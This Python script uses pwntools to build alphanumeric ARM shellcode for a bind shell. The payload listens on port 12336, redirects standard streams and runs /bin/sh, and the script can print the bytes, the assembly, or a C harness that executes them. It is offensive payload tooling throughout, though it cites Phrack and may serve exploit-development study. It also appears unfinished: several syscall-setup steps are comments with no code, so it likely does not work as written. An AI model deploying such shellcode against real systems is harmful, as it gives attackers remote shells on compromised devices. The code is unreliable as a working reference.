#!/usr/bin/python3
## Alphanumeric RISC ARM Shellcode
## Reference: http://phrack.org/issues/66/12.html

## python3-pwntools
## pip3 install git+https://github.com/arthaud/python3-pwntools.git
from pwn import *

import argparse

context.arch = 'arm'

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--raw", help="Output the raw bytes to stdout", action="store_true")
    parser.add_argument("-c", help="Output the C file to stdout", action="store_true")
    parser.add_argument("-a", "--asm", help="Output the ASM to stdout", action="store_true")
    parser.add_argument("-l", "--len", help="Output the shellcode length", action="store_true")
    args = parser.parse_args()
    c_out = args.c
    asm_out = args.asm
    raw_out = args.raw
    len_out = args.len

    shellcode = assemble_shellcode()

    if len_out:
        print("Shellcode length is", len(shellcode))

    if asm_out:
        print(disasm(shellcode))

    if c_out:
        prt_c_file(shellcode)

    if raw_out:
        sys.stdout.buffer.write(shellcode)

## Purpose: Assemble shellcode and return sequence of bytes
## Output: shellcode    <class 'bytes'>
def assemble_shellcode():
    """
    r3 ptr / immediate for store byte
    r4 ptr
    r5 negative number
    r6 immediate
    r7 ptr
    eor - r3, r4, r5, r6, r7
    r6 and r4 cannot be used as strb
    """
    shellcode = b''
    ## NOP padding, this area will be used
    ## to write sockaddr struct and temp reads / writes
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    shellcode += asm('subpl   r3, r1, #0x7A')
    ## load pc-offset into r3 in order to write2mem
    shellcode += asm('submi   r3, pc, #48')
    shellcode += asm('subpl  r3, pc, #0x30')
    shellcode += asm('eorspl  r3, r3, #65')
    shellcode += asm('eorspl  r4, r4, #65')
    shellcode += asm('eorspl  r5, r5, #65')
    shellcode += asm('eorspl  r6, r6, #65')
    shellcode += asm('eorspl  r7, r7, #65')
    shellcode += asm('eorspl  r0, r1, #65')
    shellcode += asm('eorspl  r0, r2, #65')
    shellcode += asm('eorspl  r0, r3, #65')

    # prep r7 as a ptr to store and load multiple in buf
    shellcode += asm('ldrbpl  r7, [r3, #-48]')
    shellcode += asm('subpl   r6, pc, r7, ROR #2')
    shellcode += asm('submi   r7, r3, #0x30')
    shellcode += asm('subpl   r7, r3, #0x30')
    #shellcode += asm('subpl   r6, pc, r7, ROR #2')

    # This is how you move your ptr to the end of the buffer
    # Get -121 in r5, assume r4 contains 0
    shellcode += asm('subpl    r5, r4, #121')
    shellcode += asm('subpl    r6, PC, r5, ROR #2')
    shellcode += asm('subpl    r6, PC, r5, ROR #2')
    shellcode += asm('subpl    r6, PC, r5, ROR #2')
    shellcode += asm('subpl    r6, PC, r5, ROR #2')
    shellcode += asm('subpl    r6, PC, r5, ROR #2')
    shellcode += asm('subpl    r6, PC, r5, ROR #2')

    # write sockaddr struct to mem
    # "\x02\x00" AF_INET
    # "\x30\x30" port num 0x3030 = 12336
    # "\x00\x00\x00\x00" bind IP address = 0.0.0.0

    # write 3 bytes for cache flush sw interrupt
    # strbpl  r3, [r6, #-100]
    shellcode += asm('strbpl r3, [r4, #-100]')
    shellcode += asm('strbpl r4, [r4, #-100]')
    shellcode += asm('strbpl r5, [r4, #-100]')
    shellcode += asm('strbpl r6, [r4, #-100]')
    shellcode += asm('strbpl r7, [r4, #-100]')
    # strbmi  r5, [r6, #-101]

    # write 3 bytes for socket syscall

    # write 3 bytes for bind syscall

    # write 3 bytes for listen syscall

    # write 3 bytes for accept syscall

    # write 2 bytes for each dup2 syscall

    # write 3 bytes for execve syscall

    # write 2 byte for "/" chars to make "/bin/sh"

    # store mult will write 24 bytes
    shellcode += asm('stmdbpl r7, {r0, r4, r5, r6, r8, lr}^')
    shellcode += asm('ldmdapl r7!, {r0, r1, r2, r6, r8, lr}')

    shellcode += asm('svcmi   0x00900002') # cache flush
    shellcode += asm('svcmi   0x00414141')
    ## load args for socket(2, 1, 0) -> return host_sockid
    shellcode += asm('svcmi   0x00900119') # socket
    ## load args for bind(host_sockid, &sockaddr, 16)
    shellcode += asm('svcmi   0x0090011a') # bind
    ## load args for listen(host_sockid, 0)
    shellcode += asm('svcmi   0x0090011c') # listen
    ## load args for accept(host_sockid, 0, 0) -> return client_sockid
    shellcode += asm('svcmi   0x0090011d') # accept
    ## load args for dup2(client_sockid, 0)
    ## load args for dup2(client_sockid, 1)
    ## load args for dup2(client_sockid, 2)
    shellcode += asm('svcmi   0x0090003f') # dup2
    ## load args for execve("/bin/sh", 0, 0)
    shellcode += asm('svcmi   0x0090000b') # execve
    shellcode += b"1bin2sh"
    return shellcode

## Purpose: Format and print C code to test shellcode to stdout
## Input: shellcode    <class 'bytes'>
def prt_c_file(shellcode):
    print("#include <stdio.h>\n")
    print("char shellcode[] = {")
    print(" "*4 + "\"", end="")
    for byte in shellcode:
        print("\\x{:02x}".format(byte), end="")
    print("\"")
    print("};\n")
    print("void main(void) {")
    print(" "*4 + "void (*s)(void);")
    print(" "*4 + "s = shellcode;")
    print(" "*4 + "s();")
    print("}")

if __name__ == "__main__":
    main()
